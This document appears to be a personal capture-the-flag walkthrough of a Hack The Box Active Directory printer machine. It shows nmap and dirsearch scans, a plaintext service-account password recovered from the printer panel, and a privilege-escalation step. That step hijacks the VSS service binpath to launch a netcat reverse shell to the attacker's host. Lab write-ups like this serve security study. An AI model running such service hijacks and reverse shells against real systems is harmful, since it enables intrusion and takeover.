nmap
```
┌──(kali㉿kali)-[~/HTB/return-AD]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.76.190          
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 20:20 EST
Warning: 10.129.76.190 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.76.190
Host is up (0.046s latency).
Not shown: 64478 closed tcp ports (reset), 1033 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-22 01:41:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows Server 2012 (92%), Windows Server 2019 (92%), Microsoft Windows Longhorn (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m34s
| smb2-time: 
|   date: 2025-01-22T01:42:15
|_  start_date: N/A

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   42.18 ms 10.10.14.1
2   42.60 ms 10.129.76.190

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.07 seconds
```

```
┌──(kali㉿kali)-[~/HTB/return-AD]
└─$ dirsearch -u http://10.129.76.190/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/return-AD/reports/http_10.129.76.190/__25-01-21_20-20-47.txt

Target: http://10.129.76.190/

[20:20:47] Starting: 
[20:20:48] 403 -  312B  - /%2e%2e//google.com                               
[20:20:48] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[20:21:08] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[20:21:47] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[20:22:15] 403 -    1KB - /images/                                          
[20:22:15] 301 -  151B  - /images  ->  http://10.129.76.190/images/         
[20:23:05] 200 -   28KB - /settings.php                                     
                                                                             
Task Completed
```

![Pasted image 20250122092311](<0. Attachments/Pasted image 20250122092311.png>)

updating the ip
![Pasted image 20250122094225](<0. Attachments/Pasted image 20250122094225.png>)
![Pasted image 20250122094250](<0. Attachments/Pasted image 20250122094250.png>)
user --> svc-printer
password --> 1edFg43012!!

![Pasted image 20250122094542](<0. Attachments/Pasted image 20250122094542.png>)

![Pasted image 20250122094649](<0. Attachments/Pasted image 20250122094649.png>)

![Pasted image 20250122094816](<0. Attachments/Pasted image 20250122094816.png>)

```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemtimePrivilege Change the system time Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled
```

priv esc
![Pasted image 20250122103435](<0. Attachments/Pasted image 20250122103435.png>)

![Pasted image 20250122103742](<0. Attachments/Pasted image 20250122103742.png>)
```
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.3 443"
```

![Pasted image 20250122103719](<0. Attachments/Pasted image 20250122103719.png>)

